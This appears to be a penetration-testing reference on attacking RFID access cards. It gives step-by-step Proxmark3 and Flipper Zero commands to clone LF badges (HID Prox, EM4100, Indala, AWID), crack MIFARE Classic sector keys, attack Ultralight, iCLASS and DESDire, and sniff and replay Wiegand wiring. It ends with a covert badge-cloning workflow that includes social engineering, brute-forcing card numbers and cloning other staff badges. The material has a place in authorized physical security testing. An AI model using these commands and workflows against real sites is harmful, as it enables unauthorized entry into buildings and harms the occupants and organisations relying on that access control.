RFID Attacks

Overview

RFID (Radio Frequency Identification) spans multiple frequency bands with distinct security profiles. Low-frequency (LF, 125 kHz) cards — primarily HID Prox, EM4100, and Indala — dominate older corporate access control deployments. These cards have no cryptography and are trivially cloned. High-frequency (HF, 13.56 MHz) cards — MIFARE Classic, MIFARE Ultralight, iCLASS, and DESFire — have varying security levels from completely broken (MIFARE Classic) to robust (MIFARE DESFire EV2 with diversified keys).

Physical access control is often the most direct path to network access in an engagement — getting past a door with a cloned card is simpler than bypassing perimeter network controls. The gap between card technology in the field and current best practice is enormous: many enterprises still run HID Prox (1990s technology) across hundreds of readers.

LF RFID — EM4100 and HID Prox Cloning

EM4100 (64-bit) and HID Prox are the most common access cards encountered in corporate environments. They contain only an ID number with no authentication, no encryption, and no replay protection. Any device that reads the card number and can transmit it becomes an identical clone.

# ── EM4100 (125 kHz, most basic, ubiquitous in cheap systems) ──
# Read EM4100 card:
pm3 → lf em 410x reader
# Output: EM TAG ID: 1122334455 (5-byte hex = 40-bit ID)

# Clone to T5577 blank card (writable, emulates EM4100 and many others):
pm3 → lf em 410x clone --id 1122334455
# Place blank T5577 card on PM3 → writes EM4100 ID to blank

# Flipper Zero: NFC → 125 kHz RFID → Read → place on Flipper → saved
# Emulate: 125 kHz RFID → Saved → select → Emulate (hold up to reader)

# ── HID Prox II (H10301, 26-bit) ────────────────────────────────
# Most common enterprise access card in North America, read to 125kHz
# Format: 26-bit = 1 parity bit + 8-bit facility code + 16-bit card number + 1 parity
# Read HID Prox:
pm3 → lf hid reader
# Output:
# HID H10301 26-bit ...
# Format: FC: 12  Card: 5678
# Raw: 0000000000000000000000000002AABBCC

# Clone HID to T5577:
pm3 → lf hid clone --rawid 2AABBCCDD
# Or by facility code + card number:
pm3 → lf hid clone --fc 12 --cn 5678

# Simulate HID without writing (useful for testing before cloning):
pm3 → lf hid sim --rawid 2AABBCCDD    # Transmit HID ID continuously

# ── HID Corporate 1000 (37-bit) ─────────────────────────────────
# Higher-end HID format, more bits → harder to enumerate
# Still no crypto — read and clone same way
pm3 → lf hid reader                    # Auto-detects format including Corp 1000
pm3 → lf hid clone --rawid RAWBYTES

# ── Indala (125 kHz, Motorola/HID) ──────────────────────────────
pm3 → lf indala reader
pm3 → lf indala clone --heden HEXDATA

# ── AWID (125 kHz) ───────────────────────────────────────────────
pm3 → lf awid reader
pm3 → lf awid clone --fc 12 --cn 1234

# T5577 blank cards (buy in bulk):
# Available: EM4100 compatible T5577, writable 100k+ times
# Clone EM4100, HID Prox, Indala, AWID, Paradox, and many others
# Can be reset and rewritten — useful for multiple engagements

Long-Range RFID Capture

MIFARE Classic — Sector Key Cracking

MIFARE Classic (1K / 4K) is broken. The proprietary Crypto-1 cipher was reverse-engineered, and multiple attack methods exist to recover sector keys. Once keys are recovered, all data is readable and the card can be fully cloned. Despite being known-broken since 2008, MIFARE Classic remains widely deployed.

# MIFARE Classic layout:
# 1K: 16 sectors × 4 blocks (3 data + 1 trailer)
# 4K: 32 sectors × 4 blocks + 8 sectors × 16 blocks
# Each sector has Key A and Key B + access bits in sector trailer
# Default keys: many systems leave factory defaults → trivially cracked

# Step 1: Identify and check default keys:
pm3 → hf mf chk --1k -f /usr/share/proxmark3/dictionaries/mfc_default_keys.dic
# Or: pm3 → hf mf chk --1k --def    (use built-in default key list)
# Output: [+] sector 00 key A FFFFFFFFFFFF (default!)
# Many systems: default FFFFFFFFFFFF or A0A1A2A3A4A5 for all sectors

# Step 2 — if default keys fail: Nested Authentication Attack
# Requires: knowing at least ONE valid sector key (e.g., sector 0 default)
# Attack: use known key to authenticate, observe nonce responses from other sectors
# Exploit Crypto-1 weak PRNG to recover all other sector keys

pm3 → hf mf nested --1k --blk 0 --keytype A --key FFFFFFFFFFFF --dump
# Uses sector 0 key A (FFFFFFFFFFFF) as starting point
# Recovers all other sector keys via nested attack

# Step 3 — Darkside Attack (no known keys required):
# Exploits Crypto-1 PRNG property: a specific NACK response leaks keystream bits
# Requires ~500-6000 authentications to recover first key
pm3 → hf mf darkside
# Output: Found valid key: XXXXXXXXXXXX for sector 0
# Once one key recovered → use nested attack for remaining sectors

# Step 4 — Hardnested Attack (for cards with some sectors strongly randomized):
pm3 → hf mf hardnested --blk 0 -a -k FFFFFFFFFFFF --tblk 4 --ta
# Attack sector 4 key A using known sector 0 key A

# Step 5 — Read all data once keys are known:
pm3 → hf mf dump --1k --keys dumpkeys.bin
# Dumps all 64 blocks of 1K card to binary file

# Step 6 — Clone to blank writable MIFARE Classic card (magic card):
pm3 → hf mf cload --file dumpfile.bin
# Writes all data including UID (requires magic card / gen2 card)
# Standard MIFARE: UID is write-once from factory (read-only)
# Magic cards: UID block is writable → true full clone

# Magic card types:
# Gen1a (CUID/Chinese magic): responds to special backdoor commands
# Gen2 (FUID/GDMICRO): writes UID block via standard ISO write commands
# Gen3: enhanced, detects PM3 writable format
# Gen4 (Ultimate): writable, can emulate different card types

MIFARE Ultralight Attacks

# MIFARE Ultralight (and Ultralight C / EV1):
# 48 bytes user memory, no crypto (Ultralight), 3DES auth (Ultralight C)
# Used: transit tickets, event tickets, loyalty cards, access cards

# Read Ultralight:
pm3 → hf mfu reader
pm3 → hf mfu dump                      # Dump all pages

# Ultralight C — 3DES authentication (key unknown):
pm3 → hf mfu info                      # Show auth lock status
pm3 → hf mfu keygen -n SERIAL         # Some implementations use serial-derived keys

# Check default keys for Ultralight C:
pm3 → hf mfu chk -k 49454D4B41455242  # Default key: IEMKAERB (some vendors)
pm3 → hf mfu chk -f default_keys.dic

# Ultralight EV1 — password authentication (4 bytes):
pm3 → hf mfu pwdgen                    # Common default password generation
pm3 → hf mfu chk --ul                  # Brute force 4-byte password space (small)

# Clone Ultralight to blank:
pm3 → hf mfu eload --file dump.bin    # Load dump to PM3 emulator
pm3 → hf mfu sim -t 2                 # Simulate Ultralight with loaded data

HID iCLASS Attacks

iCLASS (HF 13.56 MHz) was HID's higher-security alternative to HID Prox. The original iCLASS used DES with a master key that was compromised — all cards using the standard application area are vulnerable. iCLASS SE / iCLASS Seos (newer) use AES-128 with card-diversified keys and are significantly harder to attack.

# iCLASS (original) — master key compromise (2012):
# The iCLASS application master key (transport key) was reverse-engineered
# Allows decrypting card data for all standard-format iCLASS deployments
# Reference: "Reading between the Lines: Lessons from the OpenPICC iCLASS work"

# Read iCLASS card:
pm3 → hf iclass reader
pm3 → hf iclass info                   # Detailed card info including app areas

# Dump with known default/master keys:
pm3 → hf iclass dump -f iclass_default_keys.dic
# Proxmark3 includes iCLASS master key in firmware — enables direct dump of standard cards

# Crack iCLASS if master key not applicable:
pm3 → hf iclass loclass -f iclass_dump.bin
# loclass — offline attack against iCLASS using captured authentication traces

# Clone iCLASS to blank:
pm3 → hf iclass sim -t 3              # Simulate with data loaded into PM3

# iCLASS SE / Seos — AES-128, card-diversified keys:
# No known practical attack against full Seos implementation with diversified keys
# Relay attack (with NFCGate at HF range) still effective — bypasses need to crack keys
# Physical tampering of reader (SIO data capture before encryption in some legacy readers)

Wiegand Protocol Attacks

Wiegand is the communication protocol between card readers and access control panels. It transmits the decoded card data (facility code + card number) as unidirectional electrical pulses over two data lines (D0/D1). Wiegand has no encryption, authentication, or replay protection — it's just data on wires. Physical access to the wiring between reader and panel enables complete capture and injection.

# Wiegand sniffing (physical wire tap on D0/D1 lines):
# Standard Wiegand cable: RED (12V power), BLACK (Ground), GREEN (D0), WHITE (D1)
# Reader → Controller: 4-wire typically, sometimes 6-wire (with TAMPER + LED/BUZZER)

# Arduino Wiegand sniffer:
# Attach D0 and D1 to interrupt pins on Arduino
# Simple sketch outputs binary Wiegand frame → convert to facility code + card number
# Wiegand frame: 26-bit = 1 even parity + 8 facility + 16 card number + 1 odd parity

# Python Wiegand decode:
python3 - <<'EOF'
def decode_wiegand_26(bits: str) -> tuple:
    """Decode 26-bit Wiegand to (facility_code, card_number)"""
    if len(bits) != 26:
        raise ValueError("Expected 26 bits")
    facility = int(bits[1:9], 2)    # bits 1-8
    card_num = int(bits[9:25], 2)   # bits 9-24
    return facility, card_num

# Example 26-bit frame:
raw = "00000001100000000001010100"  # From sniffer
fc, cn = decode_wiegand_26(raw)
print(f"Facility Code: {fc}, Card Number: {cn}")
EOF

# ESPKey / Blekey — commercial Wiegand sniffers:
# ESPKey: ESP32-based, captures Wiegand from wires, BLE output to phone app
# Blekey: similar, Bluetooth LE + small form factor
# Install between reader and controller (requires ~30 seconds physical access to reader)

# Wiegand injection (replay attack):
# Once you have FC + card number, inject it directly onto the Wiegand bus
# This bypasses the reader entirely — the controller sees valid Wiegand data
# Hardware: microcontroller (Arduino/ESP32) + two 100Ω resistors to D0/D1 lines
# Open-collector output simulates Wiegand pulse timing:
# Bit 0: D0 low for 50µs
# Bit 1: D1 low for 50µs
# Interval between bits: 1-2ms (standard Wiegand timing)

# Long Wiegand formats (34-bit, 37-bit, custom):
pm3 → lf hid decode --rawid HEXBYTES   # PM3 decodes many Wiegand formats
# 26-bit: most common (North America)
# 34-bit: HID Corporate 1000
# 37-bit: HID H37 standard
# Site custom: many enterprise deployments use proprietary bit mappings

MIFARE DESFire — Modern Card Analysis

MIFARE DESFire EV2/EV3 uses AES-128 with card-diversified keys and mutual authentication. It's the target of current attacks, but the security when properly deployed is strong. Misconfigurations and poor key management create practical attack opportunities.

# DESFire EV2/EV3 architecture:
# Application model: card contains multiple applications, each with independent keys
# Key diversification: each card derives unique keys from a master secret
# Mutual authentication: card + reader authenticate each other before data access
# CMAC protection: data integrity on all communications

# Read DESFire card info (public, no key needed):
pm3 → hf mfdes info
# Output: UID, Card software version, Free memory, Applications list (AIDs)
# Applications (AIDs) are public — reveals what the card is used for

# Enumerate applications and files (auth-free info):
pm3 → hf mfdes getappids
# Lists 3-byte Application IDs (AIDs) present on card

pm3 → hf mfdes getfileids --aid 030000
# Lists File IDs within application 0x030000

pm3 → hf mfdes getfilesettings --aid 030000 --fid 01
# Get file settings: communication mode, access rights
# Access: Open (any) / MAC-protected / Encrypted

# Attack 1 — misconfigured "Open" file access:
# If files have 0xE (Free) access → readable without any authentication
pm3 → hf mfdes read --aid 030000 --fid 01 --no-auth
# Some deployments leave non-sensitive files open (logs, config) — may leak card number

# Attack 2 — default / weak application keys:
# DESFire default key: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 (all zeros)
pm3 → hf mfdes auth --aid 030000 --keyno 0 --algo aes --key 00000000000000000000000000000000
# If successful → full read/write to that application

pm3 → hf mfdes chk --aid 030000      # Check common weak keys

# Attack 3 — relay attack (bypasses all crypto):
# Relay the card transaction in real-time using NFCGate
# The reader communicates with the real card via relay → crypto is valid
# Use case: DESFire-based access control → NFCGate relay opens door
# Limitation: requires real card available for relay

# Attack 4 — side-channel analysis (specialized, lab equipment required):
# Power analysis of DESFire AES implementation during authentication
# Requires: oscilloscope (1GHz+), custom probe, many trace captures
# Practical only for security researchers with lab access

# Check relay protection (some DESFire applications implement):
# CommMode.Full = encrypted + CMAC → harder to replay but relay still works
# Transaction timer (EV3 feature): limits transaction to N milliseconds
# Transaction binding: ties transaction to specific UID → prevents some relay configs

Physical Attack Chain — Full Badge Cloning Workflow

End-to-end workflow for a physical engagement targeting LF badge access control — the most common real-world scenario.

# Phase 1: Reconnaissance
# ─────────────────────────────────────────────────────────────
# Identify card reader model from exterior photo (Google Images + product sheets)
# Reader model → card technology (most HID readers → HID Prox = LF 125kHz)
# Common indicators: HID Global logo, Lenel, Software House, Honeywell
# Frequency sticker: some readers indicate supported frequency/format

# Phase 2: Covert Capture
# ─────────────────────────────────────────────────────────────
# Option A: Shoulder/proximity capture at elevator, coffee queue, reception
# Hardware: clipboard reader (RF Ideas pcProx inside clipboard)
# or Flipper Zero in LF read mode + wait for card to be within 5-10cm

# Option B: Social engineering — pose as delivery, IT support
# Get close enough to badge while directing target's attention elsewhere

# Option C: Dumpster dive — discarded deactivated cards still readable
# Clone to T5577 → try at reader (some systems don't deactivate promptly)

# Phase 3: Identify Card Format
pm3 → lf search                        # Auto-detect: EM4100, HID, Indala, etc.
pm3 → lf hid reader                    # If HID detected: get FC and CN
# Output: FC: 118  CN: 09123

# Phase 4: Clone Card
pm3 → lf hid clone --fc 118 --cn 09123
# Write to T5577 blank card
# OR: Flipper Zero → 125 kHz RFID → Read → Emulate (no blank card needed)

# Phase 5: Test Clone
# Test against readers:
# - Badge at parking structure (lower security, test before main entrance)
# - Emergency exit reader (often same system, lower consequence)
# - Document: reader response time, indicator lights, audio feedback

# Phase 6: Enumerate Cards
# Brute force facility code + card number if only partial info captured:
pm3 → lf hid brute --fc 118 --delay 500  # Try all CNs in facility 118
# Success indicators: reader opens, different LED/buzzer response

# Phase 7: Clone Escalation — copy other card numbers in same facility:
# Corporate badge numbering often sequential: your card is 09123
# Try: 09001 through 09200 for maintenance staff / IT / exec cards
# These may have different door access levels
